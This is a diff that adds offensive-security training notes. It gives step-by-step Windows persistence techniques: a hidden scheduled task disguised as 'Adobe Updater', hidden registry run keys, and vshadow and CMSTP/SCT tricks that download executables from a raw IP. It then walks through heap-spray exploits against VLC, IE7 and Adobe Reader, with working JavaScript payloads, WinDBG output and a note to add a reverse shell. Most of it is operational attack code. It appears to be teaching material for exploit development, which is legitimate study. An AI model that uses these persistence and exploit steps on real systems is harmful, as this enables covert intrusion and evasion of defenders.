+    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
+    <AllowHardTerminate>true</AllowHardTerminate>
+    <StartWhenAvailable>true</StartWhenAvailable>
+    <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
+    <IdleSettings>
+      <StopOnIdleEnd>true</StopOnIdleEnd>
+      <RestartOnIdle>false</RestartOnIdle>
+    </IdleSettings>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <Enabled>true</Enabled>
+    <Hidden>true</Hidden>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <WakeToRun>false</WakeToRun>
+    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
+    <Priority>7</Priority>
+  </Settings>
+  <Actions Context="Author">
+    <Exec>
+      <Command>C:\Windows\System32\calc.exe</Command>
+    </Exec>
+  </Actions>
+</Task>
+ 
+---------------------------
+ 
+Now let's create the scheduled task
+---------------------------Type This-----------------------------------
+schtasks /create /tn "Adobe Updater" /xml "Adobe Flash Player Updater.xml"
+----------------------------------------------------------------------- 
+
+
+Sit back and wait for the task to trigger. By the way we got the correct XML file format by creating a scheduled tasked and exporting it to an XML file. Then we were able to make some trivial changes to the file and import it.
+
+
+
+
+---- Registry Based Persistance ---
+1. RunOnce key persistance trick
+Reference:
+https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/
+
+
+
+1. upload your executable to system
+2. add registry entry (requires admin privileges):
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001 /v "Line1" /d "||c:\path\to\malicious.exe"
+ 
+Note:
+Beacon/Shell may prevent the user to login as he is hanging in the Beacon executable. Solution: spawn new beacon and exit initial beacon.
+
+
+
+
+
+2. GLOBALFLAGS IN IMAGE FILE EXECUTION OPTIONS
+Let's try this:
+https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/
+
+
+2. Hide Reg
+Let's try this code out:
+https://gist.github.com/brianreitz/feb4e14bd45dd2e4394c225b17df5741
+
+Reference:
+https://posts.specterops.io/hiding-registry-keys-with-psreflect-b18ec5ac8353
+
+
+
+
+Get the following two files
+---------------------------
+https://raw.githubusercontent.com/jaredcatkinson/PSReflect-Functions/master/PSReflect.ps1
+https://gist.githubusercontent.com/brianreitz/feb4e14bd45dd2e4394c225b17df5741/raw/8f77b5e2f1952299f3a2dca0ef6c9266fe3e7b08/PSReflect-RegHide.ps1
+
+In "PSReflect-RegHide.ps1" line 126, you can specify which command will be executed upon reboot (ex: 'cmd /c calc.exe'). It will be invisible for regedit and powershell.
+
+To open a PowerShell command prompt either hit Windows Key + R and type in PowerShell or Start -> All Programs -> Accessories -> Windows PowerShell -> Windows PowerShell.
+
+---------------------------Type This-----------------------------------
+mkdir c:\persistance
+
+cd c:\persistance
+
+(new-object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/jaredcatkinson/PSReflect-Functions/master/PSReflect.ps1", "c:\persistance\PSReflect.ps1")
+
+(new-object System.Net.WebClient).DownloadFile("https://gist.githubusercontent.com/brianreitz/feb4e14bd45dd2e4394c225b17df5741/raw/8f77b5e2f1952299f3a2dca0ef6c9266fe3e7b08/PSReflect-RegHide.ps1", "c:\persistance\PSReflect-RegHide.ps1")
+
+.\PSReflect-RegHide.ps1
+-------------------------------------------------------------------------
+
+
+
+Now, let's check to see if the newly created registry value is hidden. You can do this by typing the following:
+---------------------------Type This-----------------------------------
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+Get-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
+----------------------------------------------------------------------- 
+However, it will be visible e.g. for Sysinternals Autorun tool
+
+
+
+3. VShadow
+Let's try this out:
+https://bohops.com/2018/02/10/vshadow-abusing-the-volume-shadow-service-for-evasion-persistence-and-active-directory-database-extraction/
+
+
+
+1. Download vshadow.exe including in the WinSDK
+    Windows 7: https://www.microsoft.com/en-us/download/details.aspx?id=8279
+    Windows 10: https://developer.microsoft.com/en-us/windows/downloads/windows-10-sdk
+2. Upload the vshadow.exe to the target machine
+3. Choose an arbitrary persistence mechanism to start vshadow.exe (e.g. Reg Key: reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v VSSBackup /t REG_EXPAND_SZ /d "C:\Temp\vshadow.exe -nw -exec=c:\windows\system32\notepad.exe c:")
+
+
+---------------------------Type This-----------------------------------
+mkdir c:\persistance
+
+cd c:\persistance
+
+(new-object System.Net.WebClient).DownloadFile("http://45.63.104.73/win10_vshadow_x64.exe", "c:\persistance\vshadow.exe")
+
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v VSSBackup /t REG_EXPAND_SZ /d "c:\persistance\vshadow.exe -nw -exec=c:\windows\system32\notepad.exe c:"
+-----------------------------------------------------------------------
+
+
+4. INF-SCT
+Let's try this out:
+https://bohops.com/2018/02/26/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence/
+https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/
+
+
+Technique 1: CMSTP
+------------------
+create "c:\persistance\cmstp.inf" with the following content:
+-----------------------------------
+;cmstp.exe cmstp.inf
+ 
+[version]
+Signature=$chicago$
+AdvancedINF=2.5
+ 
+[DefaultInstall_SingleUser]
+UnRegisterOCXs=UnRegisterOCXSection
+ 
+[UnRegisterOCXSection]
+%11%\scrobj.dll,NI,c:\persistance\test.sct
+ 
+[Strings]
+AppAct = "SOFTWARE\Microsoft\Connection Manager"
+ServiceName="Yay"
+ShortSvcName="Yay"
+----------------------------------------------------
+
+
+
+get a sample sct payload (e.g. https://gist.github.com/bohops/6ded40c4989c673f2e30b9a6c1985019) and store it in "c:\persistance\test.sct"
+
+
+---------------------------Type This-----------------------------------
+mkdir c:\persistance
+
+cd c:\persistance
+
+(new-object System.Net.WebClient).DownloadFile("https://gist.github.com/bohops/6ded40c4989c673f2e30b9a6c1985019", "c:\persistance\test.sct")
+
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v oemkey /t reg_sz /d "\"C:\Windows\System32\cmstp.exe\" /s C:\persistance\cmstp.inf"
+-----------------------------------------------------------------------
+
+ 
+reboot your machine
+your sct payload will be executed upon reboot. HOWEVER, as a Windows binary executes it, Sysinternals Autorun tool will not show it, unless you untick  "Options->Hide Windows Entries" option
+
+
+ 
+5. GPScript.exe
+Let's try this out:
+https://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/
+
+
+
+---- Cobalt Strike Agressor Persistance Scripts ----
+https://github.com/Und3rf10w/Aggressor-scripts/blob/master/kits/PersistKit/PersistKit.cna
+https://github.com/harleyQu1nn/AggressorScripts/blob/master/Persistence/UserSchtasksPersist.cna
+https://github.com/harleyQu1nn/AggressorScripts/blob/master/Persistence/ServiceEXEPersist.cna
+
+
+
+
+
+
+
+
+
+--------------------------------------------------------------------------------------------------------------------------
+
+
+####################
+# Browser Exploits #
+####################
+
+VLC smb:// exploit
+------------------
+
+EXPLOIT VECTOR
+
+smb://example.com@0.0.0.0/foo/#{AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA}
+
+Exploit Scripts
+- ffvlc
+
+ON YOUR HOST, RUN THE WEBSERVER ON PORT 8080
+
+perl daemon.py vlc0.html
+
+ON YOUR XPIE8 VM, START FIREFOX
+Browse to http://your_host_ip_address:8080/
+
+vlc0.html
+---------
+<script>
+   var buf = "";
+   for(i = 0; i < 1250; i++)
+      buf += unescape("%41%41%41%41");
+   var track = "smb://example.com\@0.0.0.0/foo/#{" + buf + "}";
+   document.write("<embed type='application/x-vlc-plugin' target='" + track + "' />");
+</script>
+
+vlc1.html
+---------
+<script>
+
+   // shellcode created in heap memory
+   var shellcode = unescape("%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc");
+
+   // 800K block of NOPS
+   var nop = unescape("%u9090%u09090");   // 4 NOPS
+   while(nop.length < 0xc0000) {
+      nop += nop;
+   }
+
+   // spray the heap with NOP+shellcode
+   var memory = new Array();
+   for(i = 0; i < 50; i++) {
+      memory[i] = nop + shellcode;
+   }
+
+   // build the exploit payload
+   var buf = "";
+   for(i = 0; i < 1250; i++)
+      buf += unescape("%41%41%41%41");
+   var track = "smb://example.com\@0.0.0.0/foo/#{" + buf + "}";
+
+   // trigger the exploit
+   document.write("<embed type='application/x-vlc-plugin' target='" + track + "' />");
+</script>
+
+perl daemon.py vlc1.html
+
+Search for where our NOPS+shellcode lies in the heap
+
+s 0 l fffffff 90 90 90 90 cc cc cc cc
+
+0:019> s 0 l fffffff 90 90 90 90 cc cc cc cc
+03dffffc  90 90 90 90 cc cc cc cc-cc cc cc cc cc cc cc cc  ................
+040ffffc  90 90 90 90 cc cc cc cc-cc cc cc cc cc cc cc cc  ................
+043ffffc  90 90 90 90 cc cc cc cc-cc cc cc cc cc cc cc cc  ................
+046ffffc  90 90 90 90 cc cc cc cc-cc cc cc cc cc cc cc cc  ................
+049ffffc  90 90 90 90 cc cc cc cc-cc cc cc cc cc cc cc cc  ................
+04cffffc  90 90 90 90 cc cc cc cc-cc cc cc cc cc cc cc cc  ................
+04fffffc  90 90 90 90 cc cc cc cc-cc cc cc cc cc cc cc cc  ................
+052ffffc  90 90 90 90 cc cc cc cc-cc cc cc cc cc cc cc cc  ................
+055ffffc  90 90 90 90 cc cc cc cc-cc cc cc cc cc cc cc cc  ................
+058ffffc  90 90 90 90 cc cc cc cc-cc cc cc cc cc cc cc cc  ................
+05bffffc  90 90 90 90 cc cc cc cc-cc cc cc cc cc cc cc cc  ................
+05effffc  90 90 90 90 cc cc cc cc-cc cc cc cc cc cc cc cc  ................
+061ffffc  90 90 90 90 cc cc cc cc-cc cc cc cc cc cc cc cc  ................
+064ffffc  90 90 90 90 cc cc cc cc-cc cc cc cc cc cc cc cc  ................
+067ffffc  90 90 90 90 cc cc cc cc-cc cc cc cc cc cc cc cc  ................
+06affffc  90 90 90 90 cc cc cc cc-cc cc cc cc cc cc cc cc  ................
+
+Edit vlc2.html
+replace %41%41%41%41 with %07%07%07%07
+
+(928.fd0): Break instruction exception - code 80000003 (first chance)
+eax=fffffd66 ebx=07070707 ecx=77c2c2e3 edx=00340000 esi=07070707 edi=07070707
+eip=07100000 esp=0e7afc58 ebp=07070707 iopl=0         nv up ei pl nz ac pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216
+07100000 cc              int     3
+0:019> u
+07100000 cc              int     3
+07100001 cc              int     3
+07100002 cc              int     3
+07100003 cc              int     3
+07100004 cc              int     3
+07100005 cc              int     3
+07100006 cc              int     3
+07100007 cc              int     3
+
+Create vlc3.html (Copy vlc2.html to vlc3.html)
+----------------------------------------------
+Win32 Reverse Shell
+- no restricted characters
+- Encoder NONE
+- use the Javascript encoded payload generated by msfweb
+
+USE AFTER FREE
+--------------
+
+struct {
+   int a;
+   int b;
+   void (*add)();
+   char c[20];
+} s1, s2;
+
+s1.a = 3;
+s1.b = 4;
+s1.add = my_add_func();
+strcpy(s1.c, "AAAAAAAAAAAAAAAAAAAAAAAAAAAA");
+:
+:
+s2.add(x, y);
+:
+
+Exploit scripts
+ie7-ms09002
+
+perl daemon.py ie7imgtag0.html
+
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=025445a0 ebx=00000000 ecx=4141ffff edx=00000002 esi=02545678 edi=80020003
+eip=7e8999cb esp=01e8f68c ebp=01e8f694 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Internet Explorer Collection\IE700\mshtml.dll - 
+mshtml!DllGetClassObject+0x4ec28:
+7e8999cb ff5104          call    dword ptr [ecx+4]    ds:0023:41420003=????????
+
+WHENEVER YOU HAVE A CRASH WHERE YOU FAULT ON:
+
+call dword ptr [reg + N]
+
+You control the reg value (completely or partially)
+
+You have an exploitable vtable overwrite.
+
+u eip-3 <--- check 3 instructions before the crash
+0:005> u eip-3
+mshtml!DllGetClassObject+0x4ec25:
+7e8999c8 8b08            mov     ecx,dword ptr [eax]
+7e8999ca 50              push    eax
+7e8999cb ff5104          call    dword ptr [ecx+4]
+
+dd eax
+0:005> dd eax
+025445a0  4141ffff 00420042 00420042 00420042
+025445b0  00420042 00420042 00420042 00420042
+025445c0  00420042 00420042 00420042 00420042
+025445d0  00420042 00000042 e8b9ce43 ff080100
+
+%u4141%u4141BBBBBBBBBBBBBBBBBBBBBBBBB
+
+<img src="%u4141%u4141BBBBBBBBBBBBBBBBBBBBBBBBB">
+<img src="%u4141%u4141BBBBBBBBBBBBBBBBBBBBBBBBB">
+<img src="%u4141%u4141BBBBBBBBBBBBBBBBBBBBBBBBB">
+<img src="%u4141%u4141BBBBBBBBBBBBBBBBBBBBBBBBB">
+<img src="%u4141%u4141BBBBBBBBBBBBBBBBBBBBBBBBB">
+<img src="%u4141%u4141BBBBBBBBBBBBBBBBBBBBBBBBB">
+<img src="%u4141%u4141BBBBBBBBBBBBBBBBBBBBBBBBB">
+<img src="%u4141%u4141BBBBBBBBBBBBBBBBBBBBBBBBB">
+<img src="%u4141%u4141BBBBBBBBBBBBBBBBBBBBBBBBB">
+:
+:
+
+EAX register ends up pointing to one of these src values
+%u4141%u4141BBBBBBBBBBBBBBBBBBBBBBBBB
+
+EAX points to ---> 4141ffff B B B B B B ...
+mov ecx, [eax]
+- what will ecx be? ECX = 4141ffff
+push eax
+call dword ptr [ecx+4]
+- EIP will jump to whatever is at memory location 4141ffff+4 = 41420003
+
+ie7imgtag1.html
+---------------
+
+var buf = unescape("%u0606%u0606BBBBBBBBBBBBBBBBBBBBBBBBB");
+
+EAX points to ---> 0606ffff B B B B B B ...
+mov ecx, [eax]
+- ecx = 0606ffff
+
+call [ecx+4]
+- call [06070003]
+
+Do we control the memory at 06070003?
+
+dd 04040404 ........ 90 90 90 90 90 90 90
+dd 05050505 ........ 90 90 90 90 90 90 90
+dd 06060606 ........ 90 90 90 90 90 90 90
+
+   06070003 --> 90909090
+
+dd 07070707 ........ 90 90 90 90 90 90 90
+
+EIP = 90909090 (whatever is stored at location 06070003)
+
+
+
+
+
+
+################
+# PDF EXPLOITS #
+################
+
+mnp0.pdf
+
+- Open up acrobat reader
+- WinDBG
+- F6 attach to AcroRd32.exe
+- g to Go
+
+EIP = 41414141
+
+Next step is to spray the heap with NOPS+shellcode, and then land EIP in the heap.
+
+mnp1.pdf
+
+All we are doing is changing EIP to 0c0c0c0c.
+There is no heap spray in this one.
+
+This exception may be expected and handled.
+eax=02e2d638 ebx=23826917 ecx=02e2d638 edx=02e2f868 esi=02c07674 edi=02c07674
+eip=0c0c0c0c esp=0013fb38 ebp=0013fbb8 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
+0c0c0c0c ??              ???
+
+We know we get EIP control
+
+mnp2.pdf
+
+Put in the heap spray.
+
+   var shellcode = unescape("%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc");
+
+   var nops = unescape("%u9090%u9090");
+
+   while(nops.length <= 32768)
+      nops += nops;
+   nops = nops.substring(0,32768 - shellcode.length);
+
+   memory = new Array();
+
+   for(i = 0; i < 1500; i++) {
+      memory[i] = nops + shellcode;
+   }
+
+1500 NOP+shellcode blocks of 32K NOPs each
+
+We would have sprayed over address 0c0c0c0c, and we hope to hit EIP = 0c0c0c0c, and get INT3.
+
+We want to see what led to the crash.
+
+EIP is invalid, so we can't disassemble around EIP
+
+We need to trace the function that called us and crashed.
+- STACK TRACE
+- Dumps all the frames from the top of the stack.
+- show you the series of calls that led up to the crash.
+- we will analyze the topmost function on the frame.
+
+WinDBG - stack trace - "k" command
+
+0:000> k
+ChildEBP RetAddr  
+WARNING: Frame IP not in any known module. Following frames may be wrong.
+0013fb34 2d843117 0x90909090
+0013fbb8 23826934 Multimedia!PlugInMain+0x41b69
+0013fbdc 23825d8c EScript!PlugInMain+0x25584
+0013fc74 238257e2 EScript!PlugInMain+0x249dc
+0013fca4 238543c5 EScript!PlugInMain+0x24432
+0013fd04 00a78de1 EScript!PlugInMain+0x53015
+0013fd20 7e418734 AcroRd32_940000!DllCanUnloadNow+0x67290
+0013fd4c 7e418816 USER32!InternalCallWinProc+0x28
+0013fdb4 7e4189cd USER32!UserCallWinProcCheckWow+0x150
+0013fe14 7e418a10 USER32!DispatchMessageWorker+0x306
+0013fe24 00a323b4 USER32!DispatchMessageW+0xf
+0013fe94 00a31de8 AcroRd32_940000!DllCanUnloadNow+0x20863
+0013fecc 0094389f AcroRd32_940000!DllCanUnloadNow+0x20297
+0013fee4 009436ee AcroRd32_940000!AcroWinMain+0x1c8
+0013ff2c 00404004 AcroRd32_940000!AcroWinMain+0x17
+0013ffc0 7c817067 AcroRd32+0x4004
+0013fff0 00000000 kernel32!BaseProcessStart+0x23
+
+2d843117 -- the return address that we would have returned to, if we didnt crash.
+address 2d843117-2 we will have a CALL instruction.
+
+u 2d843117
+u 2d843117-2
+u 2d843117-3 <---- we found the CALL instruction - call [edx+4]
+u 2d843117-4
+
+0:000> u 2d843117-3
+Multimedia!PlugInMain+0x41b66:
+2d843114 ff5204          call    dword ptr [edx+4] <---- the culprit!!!
+2d843117 6a00            push    0
+2d843119 68d8b68c2d      push    offset Multimedia!PlugInMain+0xca12a (2d8cb6d8)
+2d84311e 56              push    esi
+2d84311f e842aefdff      call    Multimedia!PlugInMain+0x1c9b8 (2d81df66)
+2d843124 83c40c          add     esp,0Ch
+2d843127 66b80100        mov     ax,1
+2d84312b 5e              pop     esi
+
+We control EDX
+edx=0c0c0c0c
+
+call [edx+4] = call [0c0c0c10]
+dd edx+4
+
+0:000> dd edx+4
+0c0c0c10  90909090 90909090 90909090 90909090
+0c0c0c20  90909090 90909090 90909090 90909090
+
+0:000> u 2d843117-7
+Multimedia!PlugInMain+0x41b62:
+2d843110 8b10            mov     edx,dword ptr [eax]
+2d843112 8bc8            mov     ecx,eax
+2d843114 ff5204          call    dword ptr [edx+4]
+
+dd eax
+
+0:000> dd eax
+02e2d680  0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c
+02e2d690  42424242 42424242 42424242 42424242
+02e2d6a0  42424242 42424242 42424242 42424242
+02e2d6b0  42424242 42424242 42424242 42424242
+02e2d6c0  42424242 42424242 00000000 00000000
+
+mnp3.pdf
+
+change the NOPs 90909090 to 0c0c0c0c
+
+mov edx, [eax]
+call [edx+4]
+
+edx = 0c0c0c0c
+edx+4 = 0c0c0c10
+contents at edx+4 will also be "0c0c0c0c"
+
+EIP will jump to 0c0c0c0c
+
+and...
+
+0:000> u 0c0c0c0c
+*** WARNING: Unable to verify checksum for C:\Program Files\Adobe\Reader 9.0\Reader\plug_ins\Multimedia.api
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Adobe\Reader 9.0\Reader\plug_ins\Multimedia.api - 
+0c0c0c0c 0c0c            or      al,0Ch
+0c0c0c0e 0c0c            or      al,0Ch
+0c0c0c10 0c0c            or      al,0Ch
+0c0c0c12 0c0c            or      al,0Ch
+0c0c0c14 0c0c            or      al,0Ch
